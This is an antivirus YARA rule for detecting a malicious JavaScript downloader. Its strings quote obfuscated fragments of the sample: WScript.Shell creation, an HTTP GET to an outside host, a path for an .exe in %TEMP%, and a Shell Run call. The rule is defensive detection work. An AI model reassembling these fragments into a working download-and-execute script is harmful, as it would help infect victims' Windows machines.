rule sig_20160328_4f017a5edbbf3d1721e6053054964b7b {
  meta:
    description = "datamaliciousorder - file 20160328_4f017a5edbbf3d1721e6053054964b7b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cbe6e0ac3d7b0181360e7af11cf2515965610bbb628f0cdc49c8f8fbabcbb28a"

  strings:
    $s1  = "function Edxlptt() {return Fbcxgl[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9tJXeAGuEGQ3Q.exe\";};" fullword ascii
    $s2  = "Qqmitkk[Imcqj](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Khjmlqod](Zsevzph() * 11)} while (Qqmitkk[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ftmshk(Vyapbqg, Rogkufpv){return Vyapbqg - Rogkufpv;};" fullword ascii
    $s5  = "var Fbcxgl = function Maxfnmwcbe() {return WScript[Veoddpo](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vdwov(Zhgarjwvbp){Fbcxgl[\"Run\"](Zhgarjwvbp, Mvhgydfvq, Mvhgydfvq);};" fullword ascii
    $s7  = "function Zsevzph(){return 22;};" fullword ascii
    $s8  = " while (Fdsqxtcyi){" fullword ascii
    $s9  = "function Eanaphmcg(Mdjcwkumc) {var Taosncpqyj = (1, 2, 3, 4, 5, Mdjcwkumc); return Taosncpqyj;};" fullword ascii
    $s10 = "var Jkujb = false;" fullword ascii
    $s11 = "function Fryjhje(){return Jbdzuycw;};" fullword ascii
    $s12 = "function Nepkfypjy()" fullword ascii
    $s13 = "return Ftmshk(Yxsolxh, Atwghikcgg);" fullword ascii
    $s14 = "Wsjmdk = true; " fullword ascii
    $s15 = "function Ldazhabbv(){return Veoddpo;};" fullword ascii
    $s16 = "var Ayppbkdr = new this[\"Date\"]();" fullword ascii
    $s17 = "var Wsjmdk = false;" fullword ascii
    $s18 = "function Tntrrhotx() {return ((Canwblu == true) && (Canwblu == Wsjmdk)) ? 1 : Mvhgydfvq;};" fullword ascii
    $s19 = "} catch(Mbrkgjxz){Fdsqxtcyi = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii
    $s20 = "var Canwblu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}